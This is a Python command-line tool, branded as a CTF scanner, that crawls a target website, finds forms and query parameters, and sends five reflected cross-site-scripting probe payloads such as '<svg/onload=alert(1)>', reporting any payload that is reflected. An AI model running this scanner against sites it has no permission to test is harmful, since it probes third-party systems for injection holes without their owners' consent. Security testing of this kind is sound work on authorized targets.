#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests, argparse, sys, re, json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from datetime import datetime, timezone
from difflib import SequenceMatcher
from collections import deque

requests.packages.urllib3.disable_warnings()

# ================= UI =================
RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
BLUE="\033[94m"; BOLD="\033[1m"; RESET="\033[0m"

BANNER = f"""{RED}{BOLD}
██╗██████╗ ██╗  ██╗███████╗███████╗
██║██╔══██╗╚██╗██╔╝██╔════╝██╔════╝
██║██║  ██║ ╚███╔╝ ███████╗███████╗
██║██║  ██║ ██╔██╗ ╚════██║╚════██║
██║██████╔╝██╔╝ ██╗███████║███████║
╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝

 IDXSS PRO – Elite CTF Scanner
{RESET}
"""

# ================= PAYLOADS =================
PAYLOADS = [
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<script>alert(1)</script>",
    "';alert(1);//",
]

# ================= HELPERS =================
def log(lvl, msg):
    c = {"INFO":BLUE,"OK":GREEN,"WARN":YELLOW,"HIGH":RED}.get(lvl,RESET)
    print(f"{c}[{lvl}]{RESET} {msg}")

def similarity(a, b):
    return SequenceMatcher(None, a, b).ratio()

def snippet(text, size=500):
    return text[:size].replace("\n"," ")

# ================= CRAWLER =================
def crawl(start, max_pages):
    visited=set()
    q=deque([start])
    urls=[]
    base=urlparse(start).netloc

    while q and len(visited)<max_pages:
        u=q.popleft()
        if u in visited:
            continue
        visited.add(u)
        try:
            r=requests.get(u,verify=False,timeout=10)
            urls.append(u)
            soup=BeautifulSoup(r.text,"html.parser")
            for a in soup.find_all("a",href=True):
                link=urljoin(u,a["href"])
                if urlparse(link).netloc==base:
                    q.append(link)
        except:
            pass
    return urls

# ================= DISCOVERY =================
def find_forms(html, base):
    soup=BeautifulSoup(html,"html.parser")
    forms=[]
    for f in soup.find_all("form"):
        inputs=[i.get("name") for i in f.find_all("input") if i.get("name")]
        if inputs:
            forms.append({
                "action":urljoin(base,f.get("action","")),
                "method":f.get("method","get").lower(),
                "inputs":inputs
            })
    return forms

def extract_params(url):
    return list(parse_qs(urlparse(url).query).keys())

# ================= CONTEXT =================
def detect_context(payload, resp):
    if payload not in resp:
        return None
    if "<script" in resp.lower():
        return "script"
    return "reflected"

# ================= REQUEST =================
def send(url, method, params, payload):
    data={p:payload for p in params}
    if method=="post":
        r=requests.post(url,data=data,verify=False,timeout=10)
    else:
        r=requests.get(url,params=data,verify=False,timeout=10)
    return r.text

# ================= MAIN =================
def main():
    print(BANNER)

    ap=argparse.ArgumentParser()
    ap.add_argument("-u","--url",required=True)
    ap.add_argument("--crawl",type=int,default=10)
    ap.add_argument("-r","--report",action="store_true",help="Save JSON report")
    ap.add_argument("-o","--output",default="idxss_pro_report.json")
    args=ap.parse_args()

    log("INFO","Crawling target...")
    urls=crawl(args.url,args.crawl)
    log("INFO",f"Discovered {len(urls)} pages")

    targets=[]
    for u in urls:
        try:
            r=requests.get(u,verify=False,timeout=10)
            for f in find_forms(r.text,u):
                targets.append((f["action"],f["method"],f["inputs"]))
            params=extract_params(u)
            if params:
                targets.append((u,"get",params))
        except:
            pass

    results=[]
    tested=0
    total=len(PAYLOADS)*len(targets)

    for endpoint,method,params in targets:
        baseline=send(endpoint,method,params,"baseline")
        for p in PAYLOADS:
            tested+=1
            sys.stdout.write(f"\r{BLUE}[SCAN]{RESET} {tested}/{total}")
            sys.stdout.flush()

            try:
                resp=send(endpoint,method,params,p)
                ctx=detect_context(p,resp)
                diff=similarity(baseline,resp)

                print(f"\n{YELLOW}--- RESPONSE ---{RESET}")
                print(snippet(resp))

                entry={
                    "endpoint":endpoint,
                    "params":params,
                    "payload":p,
                    "context":ctx,
                    "diff":diff,
                    "response":resp
                }

                if ctx:
                    log("HIGH",f"Possible XSS @ {endpoint}")
                    print(f"Context: {ctx}")

                results.append(entry)

            except:
                pass

    print(f"\n{GREEN}{BOLD}SCAN FINISHED{RESET}")

    if args.report:
        with open(args.output,"w",encoding="utf-8") as f:
            json.dump({
                "tool":"IDXSS PRO",
                "target":args.url,
                "time":datetime.now(timezone.utc).isoformat(),
                "results":results
            },f,indent=2)
        log("OK",f"Report saved: {args.output}")
    else:
        log("INFO","No report generated (use -r)")

if __name__=="__main__":
    main()
